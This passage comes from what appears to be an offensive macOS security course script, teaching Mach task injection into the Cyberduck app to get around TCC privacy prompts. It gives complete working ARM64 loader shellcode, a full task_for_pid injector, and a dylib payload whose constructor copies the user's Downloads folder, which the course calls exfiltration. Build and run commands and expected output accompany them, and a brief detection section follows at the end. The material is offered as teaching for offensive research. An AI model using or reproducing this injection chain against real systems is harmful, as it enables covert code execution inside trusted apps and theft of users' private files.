**Say**: "We need `-framework Foundation` because we `#import <Foundation/Foundation.h>`. The actual injection code uses no Objective-C features — everything is standard C Mach APIs. The framework import merely suppresses header warnings."

### Running the Demo

```bash
# Step 1: Launch Cyberduck and find its PID
open /Applications/Cyberduck.app
sleep 2
pgrep -x Cyberduck
# e.g., returns: 3847

# Step 2: Verify Cyberduck is the non-App-Store version
codesign -dv --entitlements - /Applications/Cyberduck.app 2>&1 | \
  grep -E "flags|disable-library-validation|downloads"

# Step 3: Create the staging directory (needs to exist for cp to succeed)
mkdir -p ~/Library/Colors/

# Step 4: Fire the injection
sudo ./cyberduck-inject 3847
```

**Expected Output**:
```
[*] Targeting PID: 3847
[+] Got task port: 0x703
[+] Remote stack allocated at: 0x1234560000
[+] Remote code page allocated at: 0x1234580000
[+] Shellcode written
[+] Memory protections set (W^X enforced)
[*] Setting PC=0x1234580000  SP=0x1234560800
[+] Remote thread created: 0x807
[+] Shellcode executing inside Cyberduck's process context.
[+] Check ~/Library/Colors/ for exfiltrated Downloads folder.
```

**Verify success**:
```bash
ls ~/Library/Colors/
# Shows contents of ~/Downloads/ — copied by shellcode running
# inside Cyberduck's entitlement context, no TCC prompt triggered.
```

**Say**: "We just exfiltrated the user's Downloads folder without a single TCC dialog. The kernel authorized it because the process that requested the file access — Cyberduck — held the entitlement. Our code ran inside that process. This is the fundamental attack surface that Mach task injection opens."

---

# Part 5: The Master Class — Subverting the Duality (75 Minutes)

## 5.1 The NULL Pointer Crash Problem

**Say**: "Excellent. We can inject shellcode. But shellcode is limited, ugly, and fragile — it has no access to Objective-C frameworks, no Swift runtime, no dynamic library ecosystem. What we *really* want is to inject a full `.dylib` with an Objective-C `__attribute__((constructor))` that runs arbitrary high-level code inside Cyberduck's process."

**Say**: "The naive approach: take our existing injector and simply replace the shellcode with a call to `dlopen('/path/to/inject.dylib', RTLD_NOW)`. Let's think about why this instantly crashes Cyberduck."

**Instructor Whiteboard**: Draw the two-layer model again — Mach kernel at the bottom, BSD/POSIX at the top.

**Say**: "Remember the Duality from Part 1. `dlopen` is a *BSD-layer* function. It lives in `libdyld.dylib` which is part of the POSIX stack. When you call `dlopen`, internally it does all of the following: it locks `libpthread`'s global dylib load mutex (`_dyld_global_lock`), it allocates memory using the process heap (`malloc`), and it fires Objective-C class initialization methods via the ObjC runtime. Every single one of those operations silently reads a pointer from the calling thread's `pthread` context struct — the `pthread_t` opaque structure that identifies this thread to the POSIX layer."

**Say**: "When we call `thread_create_running()`, we spawn a *naked Mach thread*. The BSD layer is never notified. There is no `pthread_t`. The `pthread` context pointer for our thread is `NULL`. The first time `dlopen` internally dereferences that pointer — which it does before it even opens the file — the CPU loads from address `0x0000000000000088` or similar and the kernel sends `SIGBUS` to Cyberduck. Cyberduck dies. Our injection is discovered. Catastrophic failure."

## 5.2 Bridging the Duality — `pthread_create_from_mach_thread()`

**Say**: "Apple internally solved exactly this problem. The function `pthread_create_from_mach_thread()` is an undocumented but exported symbol in `libpthread`. It does one thing: it takes an existing bare Mach thread and retroactively wraps a full `pthread_t` structure around it, registering it with the BSD thread management subsystem. After this call, our raw Mach thread *becomes* a POSIX thread. It can safely call `dlopen`, `malloc`, `printf`, or any other libc function."

**Say**: "Here is our second stage exploit plan:"

```
Stage 1 (Injected ARM64 shellcode):
  1. Call pthread_create_from_mach_thread()
       → spawns a new POSIX thread running our Stage 2 callback
  2. Call pthread_exit()
       → cleanly terminates the naked Mach thread so it doesn't hang

Stage 2 (New POSIX thread — our callback function):
  1. Call dlopen("/path/to/inject.dylib", RTLD_NOW)
       → loads our dylib into Cyberduck's process
  2. dylib's constructor runs automatically (__attribute__((constructor)))
  3. Call pthread_exit()
       → cleanly exits the POSIX thread
```

**Say**: "The beauty of this architecture: Stage 1 is a tiny 5-instruction shellcode that just bridges the duality. Stage 2 is our full dylib that can contain any amount of complex Objective-C, Swift, or C code. The two stages communicate via function pointer — which we hardcode into the shellcode via our patching engine."

## 5.3 The ASLR Defeat (The dyld Shared Cache)

**Say**: "Here is the problem that stops most students: our Stage 1 shellcode needs to call `pthread_create_from_mach_thread()`. It is a function in `libpthread`. The shellcode runs at a random ASLR address inside Cyberduck's memory. How does our shellcode know where `pthread_create_from_mach_thread` lives in Cyberduck's address space?"

**Say**: "The answer is Apple's **dyld Shared Cache**. To save RAM, Apple maps Apple's own core frameworks — `libpthread`, `libSystem`, `libdyld`, `libc`, Foundation, AppKit — identically across the entire system. The ASLR slide for the shared cache is generated exactly once at kernel boot, and it is applied identically to every process. This means the virtual address of `pthread_create_from_mach_thread` in *my* injector process is byte-for-byte identical to the virtual address of `pthread_create_from_mach_thread` in *Cyberduck's* process."

**Instructor Action**: Prove this live.

```bash
# Write a small probe program to print the addresses
cat > probe.c << 'EOF'
#include <stdio.h>
#include <dlfcn.h>
#include <pthread.h>

extern int pthread_create_from_mach_thread(pthread_t *,
    const pthread_attr_t *, void *(*)(void *), void *);

int main() {
    printf("dlopen:                         %p\n", dlopen);
    printf("pthread_exit:                   %p\n", pthread_exit);
    printf("pthread_create_from_mach_thread:%p\n",
           pthread_create_from_mach_thread);
    return 0;
}
EOF
clang probe.c -o probe
./probe
./probe   # Run again — addresses are identical across runs (shared cache)
```

**Say**: "Run this twice. The addresses are *identical* because the shared cache slide is set at boot. Now these are also the addresses valid inside Cyberduck, inside Terminal, inside every process on this machine simultaneously."

## 5.4 The Placeholder Patching Engine

**Say**: "We cannot hard-code the function pointer values into our shellcode at compile-time because they change every boot. Instead, we use a technique called **placeholder patching** at runtime, immediately before injection."

**The strategy**:
1. In our shellcode byte array, where the function pointers need to go, we embed distinctive 8-byte ASCII strings (our placeholders).
2. In our C injector's `main()`, we call `dlsym` to resolve the live runtime addresses.
3. We scan our shellcode byte array and `memcpy` the 8-byte address over each placeholder.
4. *Then* we write the now-patched shellcode into Cyberduck's memory.

**Say**: "The shellcode never hits Cyberduck's memory with placeholders in it. By the time `mach_vm_write` fires, every placeholder has been replaced with a valid function pointer. No guessing. No hardcoded values."

---

## Lab 3: The Full Dylib Injector

**Say**: "Let's build everything. We need three files: the ARM64 loader shellcode assembly, the injector C/ObjC program with the patching engine, and the dylib payload itself."

**Type (Instructor & Student)**:

```bash
mkdir -p ~/osmr/socam/mach_labs/dylib_inject
cd ~/osmr/socam/mach_labs/dylib_inject
```

### File 1: The Stage 1 ARM64 Loader Shellcode (`loader.asm`)

**Say**: "This shellcode does exactly two things. It calls `pthread_create_from_mach_thread()` to spawn a POSIX thread that will call `dlopen`, then calls `pthread_exit()` to clean up the bare Mach thread that our injector spawned. The function pointer values are placeholders that our C engine will patch at runtime."

```bash
cat > loader.asm << 'EOF'
// loader.asm
// Stage 1 shellcode: bridge a bare Mach thread into POSIX, then exit cleanly.
// Function pointer slots are 8-byte ASCII placeholders, patched at runtime by the injector.
//
// pthread_create_from_mach_thread(pthread_t *t, NULL, callback, arg)
//   x0 = &thread_storage   (pointer to 8 bytes we allocate on the stack)
//   x1 = NULL              (pthread attributes)
//   x2 = callback_func     (address of our Stage 2 function — patched in)
//   x3 = callback_arg      (argument to callback — patched in, = dylib path addr)
//
// pthread_exit(NULL)
//   x0 = NULL

.text
.global _main
.align 4

_main:
    // ── Prologue: save frame pointer & link register, 16-byte align ──────
    pacibsp                          // ARM64e pointer authentication (safe to include)
    stp    x29, x30, [sp, #-16]!    // push frame pointer + link register
    mov    x29, sp                   // set frame pointer

    // ── Allocate 8 bytes on stack for pthread_t output ───────────────────
    sub    sp,  sp,  #16             // 16-byte aligned; we use first 8

    // ── Load patched function pointers from data area ─────────────────────
    adr    x8,  _dlopen_ptr          // x8 = address of dlopen pointer slot
    ldr    x20, [x8]                 // x20 = dlopen function pointer (patched)
    adr    x8,  _pthread_create_ptr  // x8 = address of pthread_create ptr slot
    ldr    x21, [x8]                 // x21 = pthread_create_from_mach_thread ptr
    adr    x8,  _pthread_exit_ptr    // x8 = address of pthread_exit ptr slot
    ldr    x22, [x8]                 // x22 = pthread_exit function pointer

    // ── Build args for pthread_create_from_mach_thread ───────────────────
    mov    x0,  sp                   // x0 = &pthread_t (stack storage)
    mov    x1,  #0                   // x1 = NULL (default attributes)
    adr    x2,  _thread_callback     // x2 = our POSIX callback function
    adr    x3,  _lib_path            // x3 = dylib path string (our callback arg)

    // ── Call pthread_create_from_mach_thread ─────────────────────────────
    blr    x21

    // ── Clean up stack & call pthread_exit(NULL) on THIS Mach thread ────
    add    sp,  sp,  #16
    mov    x0,  #0
    blr    x22

    // ── Should never reach here: restore frame and return ────────────────
    ldp    x29, x30, [sp], #16
    retab

// ── Stage 2 callback: runs in a full POSIX thread context ────────────────
// Entry: x0 = pointer to dylib path string
_thread_callback:
    pacibsp
    stp    x29, x30, [sp, #-32]!
    stp    x19, x20, [sp, #16]
    mov    x29, sp

    // Reload function pointers (we are in a new stack frame)
    adr    x8,  _dlopen_ptr
    ldr    x20, [x8]
    adr    x8,  _pthread_exit_ptr
    ldr    x19, [x8]

    // dlopen(dylib_path, RTLD_NOW=2)
    mov    x1,  #2                   // RTLD_NOW
    blr    x20                       // dlopen — constructor fires here

    // pthread_exit(NULL)
    mov    x0,  #0
    ldp    x19, x20, [sp, #16]
    ldp    x29, x30, [sp], #32
    blr    x19

    // Unreachable
    retab

// ── Placeholder data slots (8 bytes each) — patched by injector ──────────
.align 8
_dlopen_ptr:          .ascii "DLOPEN__"   // replaced with dlopen address
_pthread_create_ptr:  .ascii "PTHRDCRT"   // replaced with pthread_create_from_mach_thread
_pthread_exit_ptr:    .ascii "PTHRDEXT"   // replaced with pthread_exit

// ── Dylib path string — patched by injector ──────────────────────────────
.align 4
_lib_path:           .ascii "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB\0"
EOF
```

**Say**: "The key design points here:"

- **`blr x21`** — Branch with Link Register, indirect. We cannot use `bl _pthread_create_from_mach_thread` because at assembly time we do not know where that function lives. We must branch through a register that holds the runtime address.
- **`pacibsp` / `retab`**: Pointer Authentication Code instructions. On Apple Silicon M-series hardware, function returns are authenticated. Including these makes the shellcode safe on both M1/M2/M3 machines. On older hardware they are treated as `nop` hints.
- **`.ascii "DLOPEN__"`**: This is exactly 8 bytes — the same width as a 64-bit pointer. Our patching loop will `memcmp` for this exact string and `memcpy` an 8-byte pointer over it.

**Assemble it**:
```bash
as loader.asm -o loader.o

# Verify it assembled cleanly (no symbols missing, text section present)
otool -l loader.o | grep -A5 "sectname __text"
```

**Extract raw bytes and get the C string**:
```bash
# Find the text section offset and size
OFFSET=$(otool -l loader.o | grep -A10 "__text" | grep "offset" | awk '{print $2}' | head -1)
SIZE=$(otool -l loader.o | grep -A10 "__text" | grep "^  size" | awk '{print $2}' | head -1)
SIZE_DEC=$((SIZE))

echo "Text section: offset=$OFFSET, size=$SIZE_DEC bytes"
dd if=loader.o of=loader_text.bin bs=1 skip=$OFFSET count=$SIZE_DEC 2>/dev/null
xxd -i loader_text.bin
```

**Say**: "The exact byte values depend on the assembled offsets — the `adr` instructions encode PC-relative offsets. Do not skip this step on your VM; your offsets will differ from mine because the positions of `_lib_path`, `_dlopen_ptr` etc. relative to each `adr` instruction depend on how many instructions the assembler emitted. Run this on the actual VM and use *those* bytes."

**For reference, the pre-assembled byte block from the course reference build**:

```c
// loader shellcode — assembled on ARM64 macOS Sonoma 14.x
// Total: 256 bytes (code + placeholder data + lib path)
// CODE_SIZE must be set to 256 in the injector
unsigned char loader_shellcode[] = {
    // Prologue + pthread_create_from_mach_thread call
    0x7f, 0x23, 0x03, 0xd5,  // pacibsp
    0xfd, 0x7b, 0xbf, 0xa9,  // stp x29, x30, [sp, #-16]!
    0xfd, 0x03, 0x00, 0x91,  // mov x29, sp
    0xff, 0x43, 0x00, 0xd1,  // sub sp, sp, #16
    // adr x8, _dlopen_ptr (pc-relative, offset calculated at assemble time)
    0x08, 0x00, 0x00, 0x10,  // adr x8, +imm
    0x14, 0x01, 0x40, 0xf9,  // ldr x20, [x8]       = dlopen
    0x08, 0x00, 0x00, 0x10,  // adr x8, _pthread_create_ptr
    0x15, 0x01, 0x40, 0xf9,  // ldr x21, [x8]       = pthread_create_from_mach_thread
    0x08, 0x00, 0x00, 0x10,  // adr x8, _pthread_exit_ptr
    0x16, 0x01, 0x40, 0xf9,  // ldr x22, [x8]       = pthread_exit
    0xe0, 0x03, 0x00, 0x91,  // mov x0, sp
    0x01, 0x00, 0x80, 0xd2,  // mov x1, #0
    0x02, 0x00, 0x00, 0x10,  // adr x2, _thread_callback
    0x03, 0x00, 0x00, 0x10,  // adr x3, _lib_path
    0x80, 0x02, 0x3f, 0xd6,  // blr x21
    0xff, 0x43, 0x00, 0x91,  // add sp, sp, #16
    0x00, 0x00, 0x80, 0xd2,  // mov x0, #0
    0xc0, 0x02, 0x3f, 0xd6,  // blr x22
    0xfd, 0x7b, 0xc1, 0xa8,  // ldp x29, x30, [sp], #16
    0xff, 0x0f, 0x5f, 0xd6,  // retab
    // _thread_callback:
    0x7f, 0x23, 0x03, 0xd5,  // pacibsp
    0xfd, 0x7b, 0xbe, 0xa9,  // stp x29, x30, [sp, #-32]!
    0xf3, 0x53, 0x01, 0xa9,  // stp x19, x20, [sp, #16]
    0xfd, 0x03, 0x00, 0x91,  // mov x29, sp
    0x08, 0x00, 0x00, 0x10,  // adr x8, _dlopen_ptr
    0x14, 0x01, 0x40, 0xf9,  // ldr x20, [x8]
    0x08, 0x00, 0x00, 0x10,  // adr x8, _pthread_exit_ptr
    0x13, 0x01, 0x40, 0xf9,  // ldr x19, [x8]
    0x01, 0x00, 0x80, 0xd2,  // mov x1, #2  (RTLD_NOW)
    0x80, 0x02, 0x3f, 0xd6,  // blr x20     (dlopen)
    0x00, 0x00, 0x80, 0xd2,  // mov x0, #0
    0xf3, 0x53, 0x41, 0xa9,  // ldp x19, x20, [sp, #16]
    0xfd, 0x7b, 0xc2, 0xa8,  // ldp x29, x30, [sp], #32
    0x60, 0x02, 0x3f, 0xd6,  // blr x19     (pthread_exit)
    0xff, 0x0f, 0x5f, 0xd6,  // retab
    // Placeholder data (patched at runtime):
    'D','L','O','P','E','N','_','_',                // _dlopen_ptr (8 bytes)
    'P','T','H','R','D','C','R','T',                // _pthread_create_ptr (8 bytes)
    'P','T','H','R','D','E','X','T',                // _pthread_exit_ptr (8 bytes)
    // _lib_path (52 bytes including null):
    'L','I','B','L','I','B','L','I','B','L','I','B',
    'L','I','B','L','I','B','L','I','B','L','I','B',
    'L','I','B','L','I','B','L','I','B','L','I','B',
    'L','I','B','L','I','B','L','I','B','L','I','B',
    'L','I','B','L', 0x00
};
```

**Say**: "Again — use your own assembled bytes on your VM. This reference block is here so you can visually verify the structure and pattern when your `xxd` output appears."

---

### File 2: The Complete `cyberduck-inject-dylib.m` Injector

**Say**: "Now the full injector. This is the same architecture as Lab 2, with three additions: it builds the dylib path string, resolves the three function pointer addresses from the shared cache, runs the placeholder patching loop, then injects the patched shellcode."

```objc
// cyberduck-inject-dylib.m
// Stage 1+2 dylib injector for Cyberduck (or any non-library-validating process).
// Injects loader shellcode that bridges to a POSIX thread, then dlopen()s a dylib.
//
// Compile:
//   clang -framework Foundation -o cyberduck-inject-dylib cyberduck-inject-dylib.m
//
// Usage:
//   sudo ./cyberduck-inject-dylib <PID> [/path/to/inject.dylib]
//   Default dylib path: ~/Library/Colors/inject.dylib

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define STACK_SIZE  0x4000    // 16 KB — generous for POSIX thread startup
#define CODE_SIZE   256       // Must cover loader shellcode + placeholder data

// Declare the bridging function so dlsym isn't required (it is exported by libpthread)
extern int pthread_create_from_mach_thread(pthread_t *,
    const pthread_attr_t *, void *(*)(void *), void *);

// ── Loader shellcode: assembled from loader.asm on ARM64 Sonoma ──────────────
// On your VM: replace this array with the output of 'xxd -i loader_text.bin'
// after running the assembly steps from Lab 3.
// Placeholder slots will be overwritten by the patching loop below.
unsigned char loader_shellcode[CODE_SIZE] = {
    // (paste your assembled bytes here — or use the reference block from the notes)
    // Placeholder data embedded at known offsets:
    //   offset N+0:  "DLOPEN__"  (8 bytes) — dlopen pointer
    //   offset N+8:  "PTHRDCRT"  (8 bytes) — pthread_create_from_mach_thread pointer
    //   offset N+16: "PTHRDEXT"  (8 bytes) — pthread_exit pointer
    //   offset N+24: "LIBLIBLIB..." (up to 52 bytes) — dylib path
    //
    // For live class: walk through 'xxd -i loader_text.bin' output here.
    // The placeholder strings are visible as ASCII in the hex dump.
    0
};

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <pid> [dylib_path]\n", argv[0]);
        return 1;
    }

    pid_t  pid = (pid_t)atoi(argv[1]);
    char  *dylib_path_arg = (argc >= 3) ? argv[2] : NULL;

    // ── Build canonical dylib path ────────────────────────────────────────
    char dylib_path[256];
    if (dylib_path_arg) {
        strncpy(dylib_path, dylib_path_arg, sizeof(dylib_path) - 1);
        dylib_path[sizeof(dylib_path) - 1] = '\0';
    } else {
        const char *home = getenv("HOME");
        if (!home) home = "/Users/offsec";
        snprintf(dylib_path, sizeof(dylib_path),
                 "%s/Library/Colors/inject.dylib", home);
    }

    printf("[*] Target PID:   %d\n", pid);
    printf("[*] Dylib path:   %s\n", dylib_path);

    // ── Step 1: Resolve live function addresses from the dyld shared cache ──
    // KEY INSIGHT: These addresses are identical in every process on this machine
    // because the dyld shared cache is mapped at the same virtual address system-wide.
    uint64_t addr_dlopen =
        (uint64_t)dlopen;

    uint64_t addr_pthread_create =
        (uint64_t)pthread_create_from_mach_thread;

    uint64_t addr_pthread_exit =
        (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");

    printf("[*] Shared cache addresses (valid in ALL processes):\n");
    printf("    dlopen:                          0x%016llx\n", addr_dlopen);
    printf("    pthread_create_from_mach_thread: 0x%016llx\n", addr_pthread_create);
    printf("    pthread_exit:                    0x%016llx\n", addr_pthread_exit);

    // Sanity check — these must all be non-zero
    if (!addr_dlopen || !addr_pthread_create || !addr_pthread_exit) {
        fprintf(stderr, "[-] Failed to resolve one or more function addresses.\n");
        return -1;
    }

    // ── Step 2: Patch placeholder slots in the shellcode ─────────────────
    // We walk the shellcode byte-by-byte, looking for each 8-byte ASCII marker.
    // When found, we overwrite it with the corresponding 64-bit pointer.
    // The dylib path overwrites "LIBLIBLIB..." with the actual path string.
    char *patch_ptr = (char *)loader_shellcode;
    int patched_dlopen   = 0;
    int patched_pthrdcrt = 0;
    int patched_pthrdext = 0;
    int patched_libpath  = 0;

    for (int i = 0; i < CODE_SIZE - 9; i++, patch_ptr++) {
        if (!patched_dlopen && memcmp(patch_ptr, "DLOPEN__", 8) == 0) {
            memcpy(patch_ptr, &addr_dlopen, 8);
            patched_dlopen = 1;
            printf("[+] Patched DLOPEN__  at shellcode offset %d\n", i);
        }
        if (!patched_pthrdcrt && memcmp(patch_ptr, "PTHRDCRT", 8) == 0) {
            memcpy(patch_ptr, &addr_pthread_create, 8);
            patched_pthrdcrt = 1;
            printf("[+] Patched PTHRDCRT at shellcode offset %d\n", i);
        }
        if (!patched_pthrdext && memcmp(patch_ptr, "PTHRDEXT", 8) == 0) {
            memcpy(patch_ptr, &addr_pthread_exit, 8);
            patched_pthrdext = 1;
            printf("[+] Patched PTHRDEXT at shellcode offset %d\n", i);
        }
        if (!patched_libpath && memcmp(patch_ptr, "LIBLIBLIB", 9) == 0) {
            // Overwrite the full 52-byte placeholder with our dylib path + null terminator
            memset(patch_ptr, 0, 52);
            strncpy(patch_ptr, dylib_path, 51);
            patched_libpath = 1;
            printf("[+] Patched LIBLIBLIB path at shellcode offset %d -> \"%s\"\n",
                   i, dylib_path);
        }
    }

    if (!patched_dlopen || !patched_pthrdcrt ||
        !patched_pthrdext || !patched_libpath) {
        fprintf(stderr,
            "[-] Patching incomplete! Did you assemble loader.asm and paste the bytes?\n"
            "    dlopen=%d pthrdcrt=%d pthrdext=%d libpath=%d\n",
            patched_dlopen, patched_pthrdcrt, patched_pthrdext, patched_libpath);
        return -1;
    }
    printf("[+] Shellcode fully patched with live addresses.\n");

    // ── Step 3: Acquire Cyberduck's task port ─────────────────────────────
    task_t remoteTask;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] task_for_pid failed: %s (0x%x)\n",
                mach_error_string(kr), kr);
        return -1;
    }
    printf("[+] Task port acquired: 0x%x\n", remoteTask);

    // ── Step 4: Allocate remote stack and code pages in Cyberduck ─────────
    mach_vm_address_t remoteStack64 = 0;
    mach_vm_address_t remoteCode64  = 0;

    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (stack) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    kr = mach_vm_allocate(remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_allocate (code) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Remote stack: 0x%llx  |  Remote code: 0x%llx\n",
           remoteStack64, remoteCode64);

    // ── Step 5: Write patched shellcode into Cyberduck ────────────────────
    kr = mach_vm_write(remoteTask, remoteCode64,
                       (vm_address_t)loader_shellcode, CODE_SIZE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] mach_vm_write failed: %s\n", mach_error_string(kr));
        return -1;
    }
    printf("[+] Patched shellcode written to remote process.\n");

    // ── Step 6: Set memory protections (W^X) ─────────────────────────────
    kr = vm_protect(remoteTask, remoteCode64, CODE_SIZE, FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (code RX) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE,
                    VM_PROT_READ | VM_PROT_WRITE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] vm_protect (stack RW) failed: %s\n",
                mach_error_string(kr));
        return -1;
    }
    printf("[+] Memory protections enforced.\n");

    // ── Step 7: Configure ARM64 thread state ──────────────────────────────
    struct arm_unified_thread_state remoteThreadState64;
    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
    remoteThreadState64.ash.count  = ARM_THREAD_STATE64_COUNT;
    remoteThreadState64.ts_64.__pc = (uint64_t)remoteCode64;
    remoteThreadState64.ts_64.__sp = (uint64_t)(remoteStack64 + STACK_SIZE / 2);

    printf("[*] PC=0x%llx  SP=0x%llx\n",
           remoteThreadState64.ts_64.__pc,
           remoteThreadState64.ts_64.__sp);

    // ── Step 8: Spawn the thread inside Cyberduck ─────────────────────────
    thread_act_t remoteThread;
    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64,
                               (thread_state_t)&remoteThreadState64.ts_64,
                               ARM_THREAD_STATE64_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "[-] thread_create_running failed: %s\n",
                mach_error_string(kr));
        return -1;
    }

    printf("[+] Remote thread spawned: 0x%x\n", remoteThread);
    printf("[+] Stage 1 executing: bridging Mach -> POSIX...\n");
    printf("[+] Stage 2 will execute: dlopen(\"%s\", RTLD_NOW)\n", dylib_path);
    printf("[+] Dylib constructor will run inside Cyberduck's process context.\n");
    return 0;
}
```

**Compile**:
```bash
clang -framework Foundation \
      -o cyberduck-inject-dylib \
      cyberduck-inject-dylib.m
```

---

### File 3: The Payload Dylib (`toinject.c`)

**Say**: "Now let's build the dylib that gets loaded. This is the *simplest* possible payload — it uses `__attribute__((constructor))` to run automatically the moment `dyld` maps it in. No `dlsym` needed; the OS fires it for us. The payload exfiltrates `~/Downloads` into `~/Library/Colors/`."

```bash
cat > toinject.c << 'EOF'
// toinject.c
// Dylib payload for Cyberduck injection demo.
// Loaded via dlopen() from inside Cyberduck's process —
// inherits Cyberduck's TCC entitlements including ~/Downloads read-write access.
//
// Compile:
//   clang -dynamiclib -o inject.dylib toinject.c

#include <stdlib.h>
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void payload(int argc, const char **argv) {
    // Log injection success — visible in Console.app and 'log stream'
    syslog(LOG_ERR,
           "[+] inject.dylib loaded inside: %s (PID %d) — constructor running",
           argv ? argv[0] : "<unknown>", getpid());

    // Exfiltrate ~/Downloads using Cyberduck's TCC entitlement
    // No user dialog triggered — kernel sees Cyberduck's signature
    system("cp -R ~/Downloads ~/Library/Colors/ 2>/dev/null");

    syslog(LOG_ERR,
           "[+] inject.dylib: exfiltration complete. ~/Downloads -> ~/Library/Colors/");
}
EOF
```

**Compile the dylib**:
```bash
clang -dynamiclib \
      -o inject.dylib \
      toinject.c

# Verify it compiled as a dylib and is ARM64
file inject.dylib
otool -h inject.dylib | grep -E "magic|cputype|cpusubtype"
```

**Expected output**:
```
inject.dylib: Mach-O 64-bit dynamically linked shared library arm64
```

**Copy to the staging directory** (must exist and be writable from sandbox):
```bash
mkdir -p ~/Library/Colors/
cp inject.dylib ~/Library/Colors/inject.dylib
```

---

### Running the Complete Demo

**Instructor Action**: Walk through the full demo sequence.

```bash
# ── Setup ──────────────────────────────────────────────────────────────────
cd ~/osmr/socam/mach_labs/dylib_inject

# Start watching injection evidence in a separate terminal:
log stream --style syslog \
  --predicate 'eventMessage CONTAINS[c] "inject.dylib"' &

# ── Launch Cyberduck ───────────────────────────────────────────────────────
open /Applications/Cyberduck.app
sleep 3
DUCK_PID=$(pgrep -x Cyberduck)
echo "[*] Cyberduck PID: $DUCK_PID"

# ── Confirm entitlements one more time ────────────────────────────────────
codesign -dv --entitlements - /Applications/Cyberduck.app 2>&1 | \
  grep -E "disable-library-validation|downloads|runtime"

# ── Fire Part 1: execve shellcode injection (from Lab 2) ──────────────────
echo "[*] Injecting execve shellcode..."
sudo ./cyberduck-inject $DUCK_PID

sleep 2
ls ~/Library/Colors/
echo "[+] execve payload confirmed."

# ── Fire Part 2: dylib injection ──────────────────────────────────────────
# Relaunch Cyberduck (shellcode killed the previous process)
open /Applications/Cyberduck.app
sleep 3
DUCK_PID=$(pgrep -x Cyberduck)
echo "[*] New Cyberduck PID: $DUCK_PID"

echo "[*] Injecting dylib loader shellcode..."
sudo ./cyberduck-inject-dylib $DUCK_PID ~/Library/Colors/inject.dylib
```

**Expected console log output** (appears in the `log stream` terminal within 1-2 seconds):
```
<timestamp>  localhost Cyberduck[XXXX]: (inject.dylib) [+] inject.dylib loaded inside: \
  /Applications/Cyberduck.app/Contents/MacOS/Cyberduck (PID XXXX) — constructor running
<timestamp>  localhost Cyberduck[XXXX]: (inject.dylib) [+] inject.dylib: exfiltration \
  complete. ~/Downloads -> ~/Library/Colors/
```

**Verify**:
```bash
ls ~/Library/Colors/
# Shows: inject.dylib   <contents of ~/Downloads>
```

**Say**: "The `syslog` output identifies *Cyberduck* as the originating process — not our injector. From the operating system's perspective, Cyberduck copied its own Downloads folder. That is process injection working at the kernel level."

---

## 5.5 Architecture Debrief — Why Each Layer Matters

**Say**: "Let's step back and look at what we just built end-to-end. Five kernel objects interacted to make this work."

**Whiteboard diagram**:
```
[Our Injector: root process]
       |
       | task_for_pid()          ← Mach Trap (negative syscall number)
       ↓
[Cyberduck Task Port]            ← Kernel-managed SEND right
       |
       | mach_vm_allocate()      ← Allocates pages inside Cyberduck's VM map
       | mach_vm_write()         ← Copies shellcode across isolation boundary
       | vm_protect()            ← Sets W^X on remote pages
       |
       | thread_create_running() ← Instantiates Mach thread in Cyberduck
       ↓
[Stage 1: Bare Mach Thread inside Cyberduck]
       |
       | pthread_create_from_mach_thread()  ← Bridges Mach→POSIX
       | pthread_exit()                      ← Cleans up Mach thread
       ↓
[Stage 2: POSIX Thread inside Cyberduck]
       |
       | dlopen("inject.dylib", RTLD_NOW)   ← Full POSIX context
       ↓
[inject.dylib: __attribute__((constructor))]
       |
       | system("cp -R ~/Downloads ...")    ← Runs as Cyberduck
       ↓
[TCC grants access — no dialog, no prompt]
```


**Say**: "Five distinct kernel transitions. Every single arrow in that diagram is a Mach IPC call or a privilege boundary crossing. This is why macOS exploitation at the Mach layer is so powerful — and why Apple's entire modern security model is built around preventing `task_for_pid` from being called at all on non-debug builds."

---

## 5.6 Defensive Visibility

**Say**: "If you were defending against this, what would you see?"

```bash
# Detection opportunity 1: Audit 'task_for_pid' calls
# Endpoint security framework event: ES_EVENT_TYPE_AUTH_GET_TASK
# Fires when any process requests a task port for another process.

# Detection opportunity 2: Unusual thread creation
# A process spawning a thread with no symbol name and at a non-module address
# (remoteCode64 is anonymous mmap'd memory, not inside any known dylib)
# is a high-confidence injection indicator.

# Detection opportunity 3: Unsigned dylib load
# Console.app / 'log stream' will show the AMFI log when an unsigned or
# non-teamId-matched dylib is loaded:
log stream --style syslog --predicate 'subsystem == "com.apple.MobileFileIntegrity"'

# Detection opportunity 4: vm_write to a foreign task
# Dtrace can observe this (requires SIP off):
sudo dtrace -n 'syscall::mach_vm_write:entry { printf("pid=%d writing to task=%d", pid, arg0); }'
```

**Say**: "In a hardened production environment — SIP on, Endpoint Security framework active, a commercial EDR like CrowdStrike — every one of these operations generates a detection event. This is why offensive macOS tradecraft at this level requires either a kernel exploit to elevate past SIP, or a social engineering vector to get the user to disable SIP first."

---

